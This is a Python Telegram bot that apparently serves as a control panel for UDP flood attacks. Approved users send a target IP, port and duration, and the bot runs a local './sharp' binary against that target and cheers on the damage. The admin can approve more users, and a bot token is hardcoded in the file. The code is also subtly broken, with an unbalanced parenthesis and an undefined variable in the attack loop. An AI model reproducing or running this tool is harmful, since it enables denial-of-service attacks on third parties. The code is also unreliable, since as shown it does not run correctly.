from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import subprocess
import time
import threading
import psutil  # For network stats

# Hardcoded Telegram bot token
TELEGRAM_BOT_TOKEN = "7792939487:AAHSPiFtuKa8bBmkBrsYKgFVfpoHWHu9Nfg"

# Hardcoded admin chat ID
ADMIN_CHAT_ID = 1331345346  # Replace with your admin chat ID

# List of approved users (starts with only the admin)
approved_users = [ADMIN_CHAT_ID]

# Global variables to track attack status
attack_active = False
start_time = 0
duration = 0
chat_id = None

def is_approved(chat_id):
    """Check if the user is approved."""
    return chat_id in approved_users

def start(update: Update, context: CallbackContext):
    if not is_approved(update.message.chat_id):
        update.message.reply_text("🚫 You are not approved to use this bot. Contact the admin.")
        return

    update.message.reply_text("🦾 Welcome to the Sigma UDP Flood Bot! 🦾\n\n"
                             "Use /attack <ip> <port> <time> to start the attack.\n"
                             "Example: /attack 192.168.1.1 80 60")

def attack(update: Update, context: CallbackContext):
    global attack_active, start_time, duration, chat_id

    if not is_approved(update.message.chat_id):
        update.message.reply_text("🚫 You are not approved to use this bot. Contact the admin.")
        return

    if attack_active:
        update.message.reply_text("🚨 An attack is already in progress. Chill, Sigma. 🚨")
        return

    try:
        # Parse command arguments
        args = context.args
        if len(args) != 3:
            update.message.reply_text("❌ Usage: /attack <ip> <port> <time>\n"
                                      "Example: /attack 192.168.1.1 80 60")
            return

        ip, port, time_arg = args
        duration = int(time_arg)
        chat_id = update.message.chat_id

        # Start the attack in a separate thread
        attack_thread = threading.Thread(target=run_attack, args=(ip, port, duration, update))
        attack_thread.start()

        update.message.reply_text(f"🔥 Attack initiated on {ip}:{port} for {duration} seconds. 🚀\n"
                                 "Stay tuned for real-time updates, Sigma. 💪")

    except Exception as e:
        update.message.reply_text(f"❌ Error: {str(e)}")

def run_attack(ip, port, duration, update):
    global attack_active, start_time

    attack_active = True
    start_time = time.time()
    end_time = start_time + duration

    # Run the sharp binary
    command = f"./sharp {ip} {port} {duration}"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Track network usage
    net_io_start = psutil.net_io_counters()

    # Send real-time updates
    while time.time() < end_time and attack_active:
        time_remaining = int(end_time - time.time())
        progress = int(((time.time() - start_time) / duration * 100)
        status_bar = get_status_bar(progress)

        # Calculate Mbps rate
        net_io_current = psutil.net_io_counters()
        bytes_sent = net_io_current.bytes_sent - net_io_start.bytes_sent
        mbps_rate = (bytes_sent * 8) / (time.time() - start_time) / 1_000_000  # Convert to Mbps

        # Send update message
        update_message = (
            f"⚡ Attack Status ⚡\n"
            f"🕒 Time Remaining: {time_remaining}s\n"
            f"📊 Progress: {status_bar} {progress}%\n"
            f"🚀 Mbps Rate: {mbps_rate:.2f} Mbps\n"
            f"🎯 Target: {ip}:{port}\n"
            f"💣 Stay strong, Sigma. The target is getting wrecked. 💣"
        )
        context.bot.send_message(chat_id=chat_id, text=update_message)

        # Wait for 5 seconds before the next update
        time.sleep(5)

    # Attack finished
    attack_active = False
    if time.time() >= end_time:
        update_message = (
            f"🎉 Attack successfully completed! 🎉\n"
            f"🎯 Target: {ip}:{port}\n"
            f"⏱️ Duration: {duration}s\n"
            f"💥 The target has been obliterated. Sigma energy achieved. 💥"
        )
    else:
        update_message = "🛑 Attack stopped manually. 🛑"

    context.bot.send_message(chat_id=chat_id, text=update_message)

def get_status_bar(progress):
    """Generate a text-based progress bar."""
    bar_length = 10
    filled_length = int(bar_length * progress / 100)
    bar = "█" * filled_length + "░" * (bar_length - filled_length)
    return f"[{bar}]"

def stop(update: Update, context: CallbackContext):
    global attack_active

    if not is_approved(update.message.chat_id):
        update.message.reply_text("🚫 You are not approved to use this bot. Contact the admin.")
        return

    if attack_active:
        attack_active = False
        update.message.reply_text("🛑 Attack stopped. Sigma energy preserved. 🛑")
    else:
        update.message.reply_text("🤷 No active attack to stop. Chill, Sigma. 🤷")

def approve(update: Update, context: CallbackContext):
    """Approve a user to use the bot."""
    if update.message.chat_id != ADMIN_CHAT_ID:
        update.message.reply_text("🚫 Only the admin can approve users.")
        return

    try:
        # Parse command arguments
        args = context.args
        if len(args) != 1:
            update.message.reply_text("❌ Usage: /approve <chat_id>")
            return

        user_chat_id = int(args[0])
        if user_chat_id in approved_users:
            update.message.reply_text(f"🤔 User {user_chat_id} is already approved.")
        else:
            approved_users.append(user_chat_id)
            update.message.reply_text(f"✅ User {user_chat_id} has been approved.")
    except Exception as e:
        update.message.reply_text(f"❌ Error: {str(e)}")

def main():
    # Set up the Telegram bot
    updater = Updater(TELEGRAM_BOT_TOKEN)
    dispatcher = updater.dispatcher

    # Add command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("stop", stop))
    dispatcher.add_handler(CommandHandler("approve", approve))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
